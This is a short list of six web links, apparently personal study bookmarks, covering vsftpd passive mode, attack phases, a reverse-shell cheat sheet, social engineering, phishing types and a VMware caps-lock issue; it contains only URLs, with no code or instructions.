https://serverfault.com/questions/421161/how-to-configure-vsftpd-to-work-with-passive-
mode

https://blog.cerounosoftware.com.mx/las- 5 - fases-de-un-ataque-informatico

https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/

https://es.wikipedia.org/wiki/Ingenier%C3%ADa_social_(seguridad_inform%C3%A1tica)


https://randed.com/tipos-de-phishing/

https://www.reddit.com/r/vmware/comments/gx2v6s/caps_lock_problem/


